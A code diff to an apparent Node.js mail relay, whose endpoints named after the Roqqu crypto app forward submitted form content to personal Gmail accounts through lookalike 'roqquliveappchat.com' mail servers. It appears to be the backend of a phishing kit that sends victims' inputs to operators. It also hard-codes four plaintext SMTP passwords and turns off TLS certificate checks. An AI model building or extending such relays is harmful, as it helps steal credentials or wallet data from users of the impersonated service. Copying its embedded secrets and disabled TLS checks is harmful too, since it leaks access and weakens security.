@@ -36,6 +36,7 @@ const transporter = nodemailer.createTransport({
     },
 })
 
+
 // verify connection configuration
 transporter.verify(function(error, success) {
   if (error) {
@@ -62,10 +63,27 @@ app.post('/roqquappchat', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'soulbar23@gmail.com',
+      //to: 'soulbar23@gmail.com',
+      to: 'ifestephenie@gmail',
       subject: 'New message from Roqquappchat',
       html: content,
   }
+
+  const transporter = nodemailer.createTransport({
+    host: 'mail.roqquliveappchat.com',
+    port: 465,
+    secure: true,
+    requireTLS: true,
+    socketTimeout: 1200000,
+    connectionTimeout: 1200000,
+    auth: {
+        user: 'admin@roqquliveappchat.com',
+        pass: ']h9lh-DsAzyr',
+    },
+    tls: {
+        rejectUnauthorized: false,
+    },
+})
 
   transporter.sendMail(mail, (err, data) => {
     if (err) {
@@ -93,11 +111,27 @@ app.post('/roqquapp', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'princeco12@gmail.com',
+      // to: 'princeco12@gmail.com',
+      to: 'ifestephenie@gmail',
       subject: 'New message from Roqquapp',
       html: content,
   }
 
+  const transporter = nodemailer.createTransport({
+    host: 'mail.roqquliveappchat.com',
+    port: 465,
+    secure: true,
+    requireTLS: true,
+    socketTimeout: 1200000,
+    connectionTimeout: 1200000,
+    auth: {
+        user: 'one@roqquliveappchat.com',
+        pass: 'FGChv+2Y%J8*',
+    },
+    tls: {
+        rejectUnauthorized: false,
+    },
+})
   transporter.sendMail(mail, (err, data) => {
     if (err) {
       console.log({err})
@@ -122,13 +156,30 @@ app.post('/roqqu-app', (req, res, next) => {
 
 
 
+
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'paysroqquu@gmail.com',
+      //to: 'paysroqquu@gmail.com',
+      to: 'ifestephenie@gmail',
       subject: 'New message from Roqqu-app',
       html: content,
   }
 
+  const transporter = nodemailer.createTransport({
+      host: 'mail.roqquliveappchat.com',
+      port: 465,
+      secure: true,
+      requireTLS: true,
+      socketTimeout: 1200000,
+      connectionTimeout: 1200000,
+      auth: {
+          user: 'two@roqquliveappchat.com',
+          pass: 'MR.~-DC^?W}6',
+      },
+      tls: {
+          rejectUnauthorized: false,
+      },
+  })
   transporter.sendMail(mail, (err, data) => {
     if (err) {
       console.log({err})
@@ -156,10 +207,27 @@ app.post('/roqqulive', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'obialorkingsley22@gmail.com',
+      //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
+      to: 'ifestephenie@gmail',
       subject: 'New message from Roqquliveappchat',
       html: content,
   }
+
+  const transporter = nodemailer.createTransport({
+      host: 'mail.roqquliveappchat.com',
+      port: 465,
+      secure: true,
+      requireTLS: true,
+      socketTimeout: 1200000,
+      connectionTimeout: 1200000,
+      auth: {
+          user: 'three@roqquliveappchat.com',
+          pass: 'nYrZ#&,nKb=3',
+      },
+      tls: {
+          rejectUnauthorized: false,
+      },
+  })
 
   transporter.sendMail(mail, (err, data) => {
     if (err) {
